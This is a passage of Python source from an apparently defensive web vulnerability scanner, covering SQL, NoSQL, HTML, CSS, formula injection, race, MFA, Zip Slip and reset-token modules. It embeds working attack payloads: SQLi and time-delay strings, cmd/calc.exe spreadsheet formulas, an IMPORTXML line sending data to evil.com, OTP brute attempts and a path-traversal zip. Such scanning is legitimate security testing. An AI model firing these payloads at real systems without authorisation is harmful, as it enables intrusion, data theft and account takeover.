    FUZZ = ["id","user","name","search","cat","item","page","product","pid","uid",
            "ref","order","sort","limit","from","to","key","val","filter","q",
            "search_term","keyword","category","type","status","date","range",
            "min","max","price","quantity","amount","count","offset","skip",
            "where","having","group","column","table","field","index","record",
            "entry","row","data","value","param","arg","input","query","expr"]

    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]
    if ctx:
        params = ctx.prioritise_params(params)

    try:
        bl1 = session.get(target, timeout=TIMEOUT)
        bl2 = session.get(target, timeout=TIMEOUT)
        if not bl1: return findings
        bl_text = bl1.text
        bl_len  = len(bl_text)
        bl_dynamic = bl1 and bl2 and abs(len(bl1.text)-len(bl2.text))/max(len(bl1.text),1) > 0.10
    except Exception:
        return findings

    # Pre-check: baseline must not already show errors
    for db, pat in SQLI_ERROR_PATTERNS_V7.items():
        if pat.search(bl_text):
            return findings

    for p in params:
        found = False

        # 1. Error-based (basic + WAF bypass)
        for category in ["error_basic", "waf_bypass"]:
            for pl in SQLI_PAYLOADS_V7[category]:
                try:
                    resp = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                    if not resp or resp.text == bl_text: continue
                    for db, pat in SQLI_ERROR_PATTERNS_V7.items():
                        m = pat.search(resp.text)
                        if m and not pat.search(bl_text):
                            # Gate: not in script/comment
                            pos = resp.text.find(m.group(0))
                            pre = resp.text[max(0,pos-100):pos]
                            if "//" in pre.split("\n")[-1]: continue
                            if "<!--" in pre and "-->" not in pre: continue
                            score, vector, _ = CVSS31.for_module("sqli")
                            logger.log("SQLI", f"Error-based [{db}] in '{p}' ({category})", "CRITICAL")
                            findings.append(make_finding("sqli",
                                f"SQL Injection [{db}] in '{p}'", "Critical",
                                f"{db} error on payload '{pl}' in '{p}'. Category: {category}. "
                                f"Match: {m.group(0)[:80]}",
                                "Use parameterised queries everywhere. Disable verbose DB errors. "
                                "Implement WAF with SQL injection rules.",
                                url=inject_param(target, p, pl),
                                payload=pl, cwe="CWE-89",
                                evidence=f"db={db}, cat={category}, cvss={score} {vector}",
                                confidence="High"))
                            found = True; break
                    if found: break
                except Exception: pass
            if found: break

        # 2. ORDER BY column count detection
        if not found:
            for col_n in [1,2,3,4,5,6,7,8,9,10,15,20]:
                pl = f"' ORDER BY {col_n}--"
                pl2= f"' ORDER BY {col_n+1}--"
                try:
                    r1 = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                    r2 = session.get(inject_param(target, p, pl2), timeout=TIMEOUT)
                    if not r1 or not r2: continue
                    # If col_n works (200) and col_n+1 errors → column count found
                    if (r1.status_code == 200 and r2.status_code != 200 and
                        abs(len(r1.text)-bl_len)/max(bl_len,1) < 0.10):
                        # Gate: error pattern on col_n+1
                        for db, pat in SQLI_ERROR_PATTERNS_V7.items():
                            if pat.search(r2.text) and not pat.search(bl_text):
                                score, vector, _ = CVSS31.for_module("sqli")
                                logger.log("SQLI", f"ORDER BY column count: {col_n} cols in '{p}'", "CRITICAL")
                                findings.append(make_finding("sqli",
                                    f"SQLi ORDER BY Column Count in '{p}' ({col_n} cols)", "Critical",
                                    f"ORDER BY {col_n} succeeds, ORDER BY {col_n+1} errors. "
                                    f"{col_n} columns in SELECT. UNION extraction possible.",
                                    "Use parameterised queries.",
                                    url=inject_param(target, p, pl),
                                    payload=pl, cwe="CWE-89",
                                    evidence=f"cols={col_n}, cvss={score}",
                                    confidence="High"))
                                found = True; break
                        break
                except Exception: pass
            
        # 3. Boolean-based (only on non-dynamic pages)
        if not found and not bl_dynamic and bl_len > 0:
            for tp, fp in [("' AND '1'='1'--","' AND '1'='2'--"),
                           ("1 AND 1=1--",    "1 AND 1=0--")]:
                try:
                    tr = session.get(inject_param(target, p, tp), timeout=TIMEOUT)
                    fr = session.get(inject_param(target, p, fp), timeout=TIMEOUT)
                    if not tr or not fr: continue
                    t_drift = abs(len(tr.text)-bl_len)/bl_len
                    tf_diff = abs(len(tr.text)-len(fr.text))/max(len(tr.text),1)
                    if t_drift < 0.08 and tf_diff > 0.50:
                        # Confirm
                        tr2 = session.get(inject_param(target, p, tp), timeout=TIMEOUT)
                        if not tr2: continue
                        if abs(len(tr2.text)-len(tr.text))/max(len(tr.text),1) < 0.08:
                            score, vector, _ = CVSS31.for_module("sqli")
                            logger.log("SQLI", f"Boolean-blind in '{p}'", "CRITICAL")
                            findings.append(make_finding("sqli",
                                f"Boolean-Blind SQLi in '{p}'", "Critical",
                                f"True/False payloads differ {int(tf_diff*100)}%. Stable across 2 requests.",
                                "Use parameterised queries.",
                                url=inject_param(target, p, tp),
                                payload=f"T:{tp}|F:{fp}", cwe="CWE-89",
                                evidence=f"diff={int(tf_diff*100)}%, cvss={score} {vector}",
                                confidence="Medium"))
                            found = True; break
                except Exception: pass
            
        # 4. Time-based (median of 3)
        if not found:
            import statistics as _stats
            for pl, delay_s, db in [
                ("' AND SLEEP(5)--",                    5, "MySQL"),
                ("'; WAITFOR DELAY '0:0:5'--",          5, "MSSQL"),
                ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))--", 5, "SQLite"),
                ("'; SELECT pg_sleep(5)--",              5, "PostgreSQL"),
                ("' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5, "Oracle"),
            ]:
                try:
                    bl_times = []; 
                    for _ in range(3):
                        t0=time.time(); session.get(target, timeout=TIMEOUT); bl_times.append(time.time()-t0)
                    bl_med = _stats.median(bl_times)
                    if bl_med >= 3: continue
                    confirmed = 0
                    for _ in range(2):
                        t0=time.time(); session.get(inject_param(target,p,pl),timeout=delay_s+10); atk_t=time.time()-t0
                        if atk_t >= delay_s*0.85 and atk_t > bl_med+delay_s*0.7: confirmed+=1
                    if confirmed >= 2:
                        score, vector, _ = CVSS31.for_module("sqli")
                        logger.log("SQLI", f"Time-based [{db}] in '{p}' 2/2 confirmed", "CRITICAL")
                        findings.append(make_finding("sqli",
                            f"Time-Based SQLi [{db}] in '{p}'", "Critical",
                            f"Delayed {delay_s}s on 2/2 attempts. Baseline {bl_med:.1f}s.",
                            "Use parameterised queries.",
                            url=inject_param(target, p, pl),
                            payload=pl, cwe="CWE-89",
                            evidence=f"db={db}, baseline={bl_med:.1f}s, cvss={score} {vector}",
                            confidence="High"))
                        found = True; break
                except Exception: pass
            
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# UPGRADED NoSQLi — Elasticsearch, Redis, CouchDB, 12 operators, agg pipeline
# ─────────────────────────────────────────────────────────────────────────────
def module_nosqli_v7(target, session):
    """
    A03/T1190: NoSQL Injection v7 — MongoDB, Elasticsearch, Redis, CouchDB.
    Zero-FP: 3+ operators must confirm, response must look like data.
    """
    findings = []
    ctx = get_ctx()

    FUZZ = ["q","search","id","user","username","email","password","name","key",
            "filter","login","query","find","match","where","field","value",
            "selector","criteria","condition","expression","agg","pipeline"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]

    try:
        bl = session.get(target, timeout=TIMEOUT)
        bl2 = session.get(target, timeout=TIMEOUT)
        if not bl: return findings
        if abs(len(bl.text)-len(bl2.text)) > 50: return findings
        bl_text = bl.text; bl_len = len(bl_text)
    except Exception:
        return findings

    # 1. MongoDB operator injection
    MONGO_PAYLOADS = [
        ('{"$gt":""}',         "$gt"),
        ('{"$ne": null}',      "$ne"),
        ('{"$regex":".*"}',    "$regex"),
        ('{"$exists":true}',   "$exists"),
        ('[""]',               "array"),
        ('{"$in":[1,2,3]}',    "$in"),
        ('{"$gte":0}',         "$gte"),
        ('{"$lt":999999}',     "$lt"),
        ('{"$nin":[]}',        "$nin"),
        ('{"$where":"1==1"}',  "$where"),
        ('{"$all":[""]}',      "$all"),
        ('{"$type":2}',        "$type"),
    ]
    for p in params:
        confirmed = []
        for pl, op in MONGO_PAYLOADS:
            try:
                r = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                if not r: continue
                r_len = len(r.text)
                if r_len <= bl_len * 1.8 or r_len <= bl_len + 100: continue
                body = r.text.strip()
                if not (body.startswith(("[","{"))) and '"' not in body[:100]: continue
                confirmed.append((pl, op, r_len))
            except Exception: pass

        if len(confirmed) >= 2:
            score, vector, _ = CVSS31.for_module("nosqli")
            logger.log("NOSQLI", f"MongoDB injection in '{p}': {[o for _,o,_ in confirmed[:3]]}", "CRITICAL")
            findings.append(make_finding("nosqli",
                f"MongoDB Injection in '{p}'", "High",
                f"{len(confirmed)}/12 operators confirmed enlarged response. "
                f"Operators: {[op for _,op,_ in confirmed[:5]]}.",
                "Use typed/schema-validated queries. Reject JSON objects in string params. "
                "Sanitise all input. Use allow-list for query operators.",
                url=inject_param(target, p, confirmed[0][0]),
                payload=str([pl for pl,_,_ in confirmed]),
                cwe="CWE-943",
                evidence=f"confirmed={len(confirmed)}/12, cvss={score} {vector}",
                confidence="High"))
            break

    # 2. Elasticsearch query injection
    ES_PATHS = ["/api/search", "/api/v1/search", "/search", "/_search",
                "/api/logs", "/api/v1/logs", "/api/data", "/api/v1/data"]
    ES_PAYLOADS = [
        '{"query":{"match_all":{}}}',
        '{"query":{"bool":{"must":[{"match_all":{}}]}}}',
        '{"query":{"wildcard":{"*":"*"}}}',
        '{"aggs":{"all":{"terms":{"field":"_type"}}}}',
        '{"size":10000}',
    ]
    for ep in ES_PATHS:
        url = target.rstrip("/") + ep
        try:
            for pl in ES_PAYLOADS[:2]:
                r = safe_post(session, url, data=pl, timeout=TIMEOUT,
                              headers={"Content-Type":"application/json"})
                if r and r.status_code == 200:
                    body = r.text
                    if any(ind in body for ind in ["hits","_source","_index","took","shards","total"]):
                        if len(body) > bl_len + 50:
                            score, vector, _ = CVSS31.for_module("nosqli")
                            logger.log("NOSQLI", f"Elasticsearch injection at {ep}", "WARNING")
                            findings.append(make_finding("nosqli",
                                f"Elasticsearch Query Injection at {ep}", "High",
                                f"Elasticsearch accepts arbitrary query DSL at {ep}. "
                                f"Full index data may be extractable.",
                                "Restrict ES query API to authenticated internal users. "
                                "Disable external ES access. Use field-level security.",
                                url=url, payload=pl, cwe="CWE-943",
                                evidence=f"es_fields=hits/_source, cvss={score}",
                                confidence="High"))
                            break
        except Exception: pass

    # 3. Redis command injection (via web APIs that proxy to Redis)
    REDIS_PATHS = ["/api/cache", "/api/v1/cache", "/cache", "/api/redis",
                   "/api/session", "/api/v1/session"]
    REDIS_PAYLOADS = [
        "\r\nPING\r\n",
        "PING\r\n",
        "*1\r\n$4\r\nPING\r\n",  # Redis protocol PING
    ]
    for ep in REDIS_PATHS:
        url = target.rstrip("/") + ep
        try:
            for pl in REDIS_PAYLOADS:
                r = safe_post(session, url, data=pl, timeout=TIMEOUT)
                if r and any(ind in r.text for ind in ["+PONG", "PONG", "redis_version"]):
                    findings.append(make_finding("nosqli",
                        f"Redis Command Injection at {ep}", "Critical",
                        f"Redis PING command returned PONG at {ep}. "
                        f"Full Redis access may be possible.",
                        "Never proxy user input directly to Redis. Use ORM/abstraction layer.",
                        url=url, payload=pl, cwe="CWE-77",
                        confidence="High"))
                    break
        except Exception: pass

    # 4. CouchDB injection
    COUCH_PATHS = ["/_all_dbs", "/_users", "/_session",
                   "/api/couch", "/_api/couch"]
    for ep in COUCH_PATHS:
        url = target.rstrip("/") + ep
        try:
            r = safe_get(session, url)
            if r and r.status_code == 200:
                if any(ind in r.text for ind in ['"couchdb"', '"db_name"', '"all_dbs"',
                                                  '"_design"', 'CouchDB']):
                    findings.append(make_finding("nosqli",
                        f"CouchDB Exposed at {ep}", "High",
                        f"CouchDB endpoint accessible at {ep}. Database enumeration possible.",
                        "Restrict CouchDB admin access. Enable authentication. "
                        "Do not expose CouchDB ports/endpoints publicly.",
                        url=url, cwe="CWE-943", confidence="High"))
        except Exception: pass

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# HTML INJECTION (separate from XSS)
# ─────────────────────────────────────────────────────────────────────────────
def module_html_injection(target, session):
    """
    A03: HTML Injection — injecting HTML without JS execution.
    Used for phishing via page content manipulation.
    Zero-FP: inject unique marker tags, verify unescaped in HTML context.
    """
    findings = []
    logger.log("HTML-INJ", "HTML injection …")

    CANARY = f"ddHTMLINJ{hashlib.md5(str(time.time()).encode()).hexdigest()[:6]}"
    PAYLOADS = [
        f"<h1>{CANARY}</h1>",
        f"<b>{CANARY}</b>",
        f"<a href='http://evil.com'>{CANARY}</a>",
        f"<marquee>{CANARY}</marquee>",
        f"<p style='color:red'>{CANARY}</p>",
        f"<input type='hidden' value='{CANARY}'>",
        f"<img alt='{CANARY}'>",
    ]
    FUZZ = ["q","search","name","title","message","content","text","body",
            "desc","description","comment","note","subject","feedback","msg",
            "param","value","data","input","query","tag","label","caption"]

    try:
        bl = session.get(target, timeout=TIMEOUT)
        if not bl: return findings
    except Exception:
        return findings

    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]

    for p in params:
        for pl in PAYLOADS:
            try:
                resp = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                if not resp: continue
                if "text/html" not in resp.headers.get("Content-Type",""):
                    continue
                if CANARY not in resp.text:
                    continue
                # Must NOT be HTML-encoded
                if "&lt;" in resp.text and CANARY in resp.text.split("&lt;")[0]:
                    pass
                elif f"&lt;h1&gt;" in resp.text or f"&lt;b&gt;" in resp.text:
                    continue

                # Must appear inside HTML body (not in script/style)
                canary_pos = resp.text.find(CANARY)
                context = resp.text[max(0,canary_pos-200):canary_pos+200]
                if "<script" in context and "</script>" not in context.split(CANARY)[0]:
                    continue

                score, vector, _ = CVSS31.for_module("xss")
                logger.log("HTML-INJ", f"HTML injection in '{p}'", "WARNING")
                findings.append(make_finding("xss",
                    f"HTML Injection in '{p}'", "Medium",
                    f"HTML tags injected via '{p}' render unescaped. "
                    f"Payload: {pl[:60]}. Enables phishing via page content manipulation.",
                    "HTML-encode all user input before rendering. "
                    "Use strict CSP. Validate and sanitise input.",
                    url=inject_param(target, p, pl),
                    payload=pl, cwe="CWE-80",
                    evidence=f"cvss={score} {vector}",
                    confidence="Medium"))
                break
            except Exception:
                pass

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# CSS INJECTION — data exfiltration via CSS attribute selectors
# ─────────────────────────────────────────────────────────────────────────────
def module_css_injection(target, session):
    """
    A03: CSS Injection — inject CSS to exfiltrate data via attribute selectors.
    Used to steal CSRF tokens, API keys visible in the DOM.
    """
    findings = []
    logger.log("CSS-INJ", "CSS injection …")

    CANARY = f"ddcss{hashlib.md5(str(time.time()).encode()).hexdigest()[:6]}"
    PAYLOADS = [
        f"</style><style>body{{color:red}}#{CANARY}{{",
        "color:red;}}#" + CANARY + "{{",
        "</textarea></style><style>" + CANARY + "{{color:red}}",
        "}" + CANARY + "{{color:red",
        "*{-moz-binding:url('data:text/xml,...')}",
    ]
    FUZZ = ["style","css","color","theme","skin","class","id","font","background",
            "q","search","name","content","text","param","value","data"]

    try:
        bl = session.get(target, timeout=TIMEOUT)
        if not bl: return findings
    except Exception:
        return findings

    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]

    for p in params:
        for pl in PAYLOADS[:3]:
            try:
                resp = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                if not resp: continue
                ct = resp.headers.get("Content-Type","")
                # CSS injection can appear in HTML or CSS responses
                if "text/html" not in ct and "text/css" not in ct:
                    continue
                if CANARY not in resp.text and pl.replace(CANARY,"").split("{")[0] not in resp.text:
                    continue
                # Gate: not HTML-encoded
                if "&lt;" in resp.text[:resp.text.find(CANARY)]:
                    continue

                logger.log("CSS-INJ", f"CSS injection in '{p}'", "WARNING")
                findings.append(make_finding("xss",
                    f"CSS Injection in '{p}'", "Medium",
                    f"CSS payload reflected unescaped in '{p}'. "
                    f"Attackers can use CSS attribute selectors to exfiltrate DOM data (CSRF tokens etc).",
                    "Encode all user input in CSS contexts. "
                    "Implement strict CSP: style-src 'none' or 'self'.",
                    url=inject_param(target, p, pl),
                    payload=pl[:80], cwe="CWE-74",
                    confidence="Medium"))
                break
            except Exception:
                pass

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# FORMULA / CSV INJECTION (spreadsheet injection)
# ─────────────────────────────────────────────────────────────────────────────
def module_formula_injection(target, session):
    """
    A03: Formula/CSV Injection — inject spreadsheet formulas into exported data.
    Executes when victim opens CSV/XLS export in Excel/LibreOffice.
    """
    findings = []
    logger.log("FORMULA-INJ", "Formula/CSV injection …")

    CANARY = f"ddFORM{hashlib.md5(str(time.time()).encode()).hexdigest()[:6]}"
    PAYLOADS = [
        f"=cmd|' /C calc.exe'!A1-{CANARY}",
        f'=HYPERLINK("http://evil-{CANARY}.com","click")',
        f"@SUM(1+1)*cmd|' /C calc.exe'!A0-{CANARY}",
        f"+cmd|' /C calc.exe'!A0-{CANARY}",
        f"-2+3+cmd|' /C calc.exe'!A0-{CANARY}",
        f"\t=cmd|' /C calc.exe'!A0-{CANARY}",
        f"={CANARY}&cmd|' /C calc.exe'!A0",
        f'=IMPORTXML(CONCAT("http://evil.com/steal?data=",A2),"//root")-{CANARY}',
    ]
    EXPORT_PATHS = ["/export", "/api/export", "/download", "/api/download",
                    "/report", "/api/report", "/export.csv", "/data/export",
                    "/users/export", "/api/users/export"]
    FUZZ = ["name","username","first_name","last_name","email","company",
            "address","city","phone","title","description","note","comment"]

    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]

    for p in params:
        for pl in PAYLOADS[:4]:
            try:
                r = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                if not r: continue
                # Check if response is a CSV/XLS download
                ct = r.headers.get("Content-Type","")
                cd = r.headers.get("Content-Disposition","")
                if "csv" in ct or "excel" in ct or "spreadsheet" in ct or "csv" in cd:
                    if CANARY in r.text or pl[:20].split("-")[0] in r.text:
                        logger.log("FORMULA-INJ", f"Formula injection in '{p}'", "WARNING")
                        findings.append(make_finding("xss",
                            f"Formula/CSV Injection in '{p}'", "Medium",
                            f"Spreadsheet formula injected via '{p}' into CSV export. "
                            f"Will execute when victim opens in Excel/LibreOffice.",
                            "Prefix all user data with single quote in CSV exports. "
                            "Validate that cell values cannot start with =, +, -, @, tab.",
                            url=inject_param(target, p, pl),
                            payload=pl[:80], cwe="CWE-1236",
                            confidence="High"))
                        break
            except Exception:
                pass

    # Check export endpoints directly
    for ep in EXPORT_PATHS:
        url = target.rstrip("/") + ep
        try:
            r = safe_get(session, url)
            if r and r.status_code == 200:
                ct = r.headers.get("Content-Type","")
                cd = r.headers.get("Content-Disposition","")
                if ("csv" in ct or "excel" in ct or "csv" in cd) and len(r.text) > 50:
                    # Check if existing data contains formula patterns
                    if re.search(r'^[=+\-@\t]', r.text, re.M):
                        findings.append(make_finding("xss",
                            f"Potential Formula Injection in Export: {ep}", "Low",
                            f"Export endpoint {ep} returns CSV/XLS with values starting with =, +, -, @, tab. "
                            f"If user-controlled, formula injection is possible.",
                            "Sanitise all exported data. Prefix with single quote.",
                            url=url, cwe="CWE-1236",
                            confidence="Low"))
        except Exception:
            pass

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# RACE CONDITION — concurrent request testing
# ─────────────────────────────────────────────────────────────────────────────
def module_race_condition(target, session):
    """
    A04: Race condition detection via parallel requests.
    Tests: coupon use, transfer, vote, like — any state-changing operation.
    Zero-FP: 20 concurrent requests, response inconsistency = FP gate.
    """
    findings = []
    logger.log("RACE", "Race condition test …")

    import threading as _th, concurrent.futures as _cf

    # Find state-changing endpoints
    resp = safe_get(session, target)
    if not resp: return findings

    # Look for forms with POST and state-changing actions
    RACE_PATHS = [
        "/api/vote", "/api/like", "/api/coupon", "/api/redeem",
        "/api/transfer", "/api/purchase", "/api/apply",
        "/api/v1/vote", "/api/v1/like", "/api/v1/redeem",
        "/checkout/apply", "/cart/apply", "/promo/apply",
    ]

    for ep in RACE_PATHS:
        url = target.rstrip("/") + ep
        try:
            probe = safe_get(session, url)
            if not probe or probe.status_code not in (200, 405): continue

            # Send 15 concurrent identical requests
            CONCURRENT = 15
            results = []
            barrier = _th.Barrier(CONCURRENT)

            def send_req():
                try:
                    barrier.wait(timeout=5)  # All threads start simultaneously
                    r = session.post(url,
                                     json={"code":"SAVE10","amount":100},
                                     timeout=TIMEOUT)
                    results.append(r.status_code if r else 0)
                except Exception:
                    results.append(0)

            threads = [_th.Thread(target=send_req, daemon=True) for _ in range(CONCURRENT)]
            for t in threads: t.start()
            for t in threads: t.join(timeout=15)

            if not results: continue

            # Analysis: if multiple 200s with same "success" content — race condition
            successes = results.count(200)
            if successes >= 3:
                # Gate: more than 2 succeed = race condition (not just normal)
                score, vector, _ = CVSS31.for_module("business_logic")
                logger.log("RACE", f"Race condition at {ep}: {successes}/{CONCURRENT} succeeded", "WARNING")
                findings.append(make_finding("business_logic",
                    f"Race Condition at {ep}", "High",
                    f"{successes}/{CONCURRENT} concurrent requests to {ep} succeeded. "
                    f"State-changing operation may be exploitable multiple times.",
                    "Implement database-level locks. Use atomic operations. "
                    "Add idempotency keys to state-changing requests. "
                    "Use optimistic locking with version counters.",
                    url=url, cwe="CWE-362",
                    evidence=f"successes={successes}/{CONCURRENT}, cvss={score}",
                    confidence="Medium"))
        except Exception: pass

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# MFA / 2FA BYPASS DETECTION
# ─────────────────────────────────────────────────────────────────────────────
def module_mfa_bypass(target, session):
    """
    A07: MFA/2FA bypass detection.
    Tests: OTP bruteforce (rate limit), response manipulation, backup code exposure.
    """
    findings = []
    logger.log("MFA-BYPASS", "MFA/2FA bypass checks …")

    MFA_PATHS = ["/api/otp", "/api/2fa", "/api/totp", "/api/mfa",
                 "/api/v1/otp", "/api/v1/2fa", "/api/v1/verify",
                 "/auth/otp", "/auth/2fa", "/auth/verify",
                 "/login/verify", "/login/2fa", "/verify"]

    for ep in MFA_PATHS:
        url = target.rstrip("/") + ep
        try:
            probe = safe_get(session, url)
            if not probe or probe.status_code not in (200, 401, 403): continue
            body = probe.text.lower()
            if not any(w in body for w in ["otp","2fa","totp","code","verify","token"]): continue

            # Test 1: Rate limiting on OTP endpoint (send 10 rapid attempts)
            codes = []
            for otp in ["000000","111111","123456","999999","000001","111110",
                         "654321","123123","456789","999998"]:
                try:
                    r = session.post(url,
                                     json={"otp":otp,"code":otp,"token":otp},
                                     timeout=TIMEOUT)
                    codes.append(r.status_code if r else 0)
                except Exception:
                    codes.append(0)

            if 429 not in codes and 503 not in codes and codes:
                findings.append(make_finding("rate_limit",
                    f"No Rate Limiting on MFA Endpoint: {ep}", "High",
                    f"10 OTP attempts to {ep} returned no 429. "
                    f"OTP bruteforce possible (6-digit = 1,000,000 combinations at unlimited speed).",
                    "Implement strict rate limiting on MFA: max 3-5 attempts. "
                    "Add progressive delays. Lock account after N failures.",
                    url=url, cwe="CWE-307",
                    evidence=f"codes={sorted(set(codes))}, no 429 in 10 attempts",
                    confidence="High"))

            # Test 2: Check if OTP can be bypassed via response manipulation hint
            # Send obviously wrong OTP — check response for clues
            r_wrong = session.post(url, json={"otp":"000000","code":"000000"}, timeout=TIMEOUT)
            if r_wrong:
                body_w = r_wrong.text.lower()
                if any(hint in body_w for hint in
                       ["remaining","attempts left","try again","invalid code"]):
                    findings.append(make_finding("default_creds",
                        f"MFA Endpoint Reveals Attempt Count: {ep}", "Low",
                        f"Response reveals attempt information: '{r_wrong.text[:100]}'. "
                        f"Confirms OTP bruteforce viability.",
                        "Return generic error messages. Do not reveal attempt counts.",
                        url=url, cwe="CWE-204", confidence="Medium"))

        except Exception:
            pass

    # Test 3: Backup codes exposure
    BACKUP_PATHS = ["/api/backup-codes", "/api/2fa/backup", "/api/mfa/recovery",
                    "/account/backup-codes", "/settings/2fa/backup"]
    for ep in BACKUP_PATHS:
        url = target.rstrip("/") + ep
        try:
            r = safe_get(session, url)
            if r and r.status_code == 200:
                body = r.text.lower()
                if any(w in body for w in ["backup","recovery","code"]) and len(r.text) > 20:
                    findings.append(make_finding("sensitive_files",
                        f"MFA Backup Codes Accessible: {ep}", "High",
                        f"MFA backup/recovery codes accessible at {ep} without additional auth.",
                        "Require password re-confirmation before showing backup codes. "
                        "Implement strict access control on backup code endpoints.",
                        url=url, cwe="CWE-522", confidence="Medium"))
        except Exception:
            pass

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# ZIP SLIP — archive path traversal in file upload
# ─────────────────────────────────────────────────────────────────────────────
def module_zip_slip(target, session):
    """
    A04: Zip Slip — path traversal via malicious archive filename.
    Creates a zip with a traversal filename, uploads, checks for extraction.
    Detection only — does not read files.
    """
    findings = []
    logger.log("ZIP-SLIP", "Zip Slip detection …")

    import zipfile, io

    UPLOAD_PATHS = ["/upload", "/api/upload", "/file/upload", "/import",
                    "/api/import", "/api/v1/upload", "/files/upload",
                    "/attachments", "/api/attachments"]

    # Build malicious zip in memory
    CANARY = f"ddzip{hashlib.md5(str(time.time()).encode()).hexdigest()[:6]}"
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        # Traversal paths targeting common web roots
        for traversal in [
            f"../../../var/www/html/{CANARY}.txt",
            f"..\\..\\..\\inetpub\\wwwroot\\{CANARY}.txt",
            f"../../../../tmp/{CANARY}.txt",
        ]:
            zf.writestr(traversal, f"zipslip-{CANARY}")
    zip_bytes = zip_buffer.getvalue()

    for ep in UPLOAD_PATHS:
        url = target.rstrip("/") + ep
        try:
            probe = safe_get(session, url)
            if probe and probe.status_code not in (200, 405, 403): continue

            files = {"file": (f"test_{CANARY}.zip", zip_bytes, "application/zip")}
            r = session.post(url, files=files, timeout=TIMEOUT)
            if not r: continue

            if r.status_code in (200, 201):
                # Check if traversal file is accessible
                for check_path in [f"/{CANARY}.txt", f"/tmp/{CANARY}.txt"]:
                    check_url = target.rstrip("/") + check_path
                    try:
                        cr = safe_get(session, check_url)
                        if cr and cr.status_code == 200 and f"zipslip-{CANARY}" in cr.text:
                            findings.append(make_finding("file_upload",
                                f"Zip Slip — Path Traversal via Archive at {ep}", "Critical",
                                f"Malicious zip extracted traversal file to web root. "
                                f"File accessible at {check_url}.",
                                "Validate all archive entry paths. Reject entries with '../' or absolute paths. "
                                "Extract to isolated sandbox directory.",
                                url=url, cwe="CWE-22",
                                evidence=f"canary_found_at={check_url}",
                                confidence="High"))
                            # Cleanup
                            try: session.delete(check_url, timeout=5)
                            except: pass
                            return findings
                    except Exception:
                        pass

                # Even without confirmation — flag that zip was accepted
                resp_body = r.text.lower()
                if any(s in resp_body for s in ["success","uploaded","created","ok"]):
                    findings.append(make_finding("file_upload",
                        f"Zip Upload Accepted — Possible Zip Slip at {ep}", "Medium",
                        f"Server accepted zip file with path-traversal entries at {ep}. "
                        f"Zip Slip possible if paths not validated during extraction.",
                        "Validate all archive entry filenames. Use secure extraction libraries.",
                        url=url, cwe="CWE-22", confidence="Low"))
        except Exception:
            pass

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# RESET TOKEN ENTROPY — password reset link predictability
# ─────────────────────────────────────────────────────────────────────────────
def module_reset_token_entropy(target, session):
    """
    A07: Password reset token entropy — low-entropy tokens are predictable.
    Requests 3 tokens, checks entropy and similarity.
    """
    findings = []
    logger.log("RESET-ENT", "Password reset token entropy …")

    RESET_PATHS = ["/forgot-password", "/api/forgot-password",
                   "/api/v1/forgot-password", "/reset-password",
                   "/api/reset", "/auth/forgot", "/account/forgot"]

    for ep in RESET_PATHS:
        url = target.rstrip("/") + ep
        try:
            probe = safe_get(session, url)
            if not probe or probe.status_code not in (200,): continue
            if "email" not in probe.text.lower() and "reset" not in probe.text.lower(): continue

            # Request 3 tokens
            tokens = []
            for _ in range(3):
                r = session.post(url,
                                  json={"email":"entropy_test@dd-scanner.com"},
                                  timeout=TIMEOUT)
                if r and r.status_code in (200, 201):
                    # Extract token from response if exposed
                    token_match = re.search(
                        r"token[\"']?\s*[=:]\s*[\"']?([A-Za-z0-9+/=\-_]{20,})",
                        r.text, re.I)
                    if token_match:
                        tokens.append(token_match.group(1))
                    # Also look for reset URL
                    url_match = re.search(r"https?://[^\s\"']+reset[^\s\"']+", r.text, re.I)
                    if url_match:
                        tk = re.search(r"token[=:]([A-Za-z0-9+/=\-_]{10,})", url_match.group(0), re.I)
                        if tk: tokens.append(tk.group(1))

            if len(tokens) >= 2:
                # Check entropy
                avg_entropy = sum(entropy(t) for t in tokens) / len(tokens)
                if avg_entropy < 3.0:
                    logger.log("RESET-ENT", f"Low token entropy: {avg_entropy:.2f}", "WARNING")
                    findings.append(make_finding("session_fix",
                        f"Low-Entropy Password Reset Token at {ep}", "High",
                        f"Reset tokens have low entropy ({avg_entropy:.2f} bits/char). "
                        f"Sample: {tokens[0][:20]}… Predictable tokens enable account takeover.",
                        "Use cryptographically secure random tokens (min 128 bits of entropy). "
                        "Use Python secrets.token_urlsafe(32) or equivalent. "
                        "Expire tokens after 15 minutes.",
                        url=url, cwe="CWE-330",
                        evidence=f"entropy={avg_entropy:.2f}, tokens={[t[:12]+'...' for t in tokens[:2]]}",
                        confidence="High"))
                # Check sequential/predictable
                if len(tokens) >= 2 and tokens[0][:8] == tokens[1][:8]:
                    findings.append(make_finding("session_fix",
                        f"Sequential Reset Tokens at {ep}", "Critical",
                        f"Reset tokens share common prefix ({tokens[0][:8]}). "
                        f"Tokens may be sequential/predictable.",
                        "Use cryptographically random, non-sequential tokens.",
                        url=url, cwe="CWE-330",
                        evidence=f"prefix_match={tokens[0][:8]}",
                        confidence="Medium"))
        except Exception:
            pass

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# WHOIS + ASN + CLOUD PROVIDER DETECTION
# ─────────────────────────────────────────────────────────────────────────────
def module_whois_asn(target, session):
    """
    Passive recon: WHOIS data, ASN, cloud provider detection from IP ranges.
    """
    findings = []
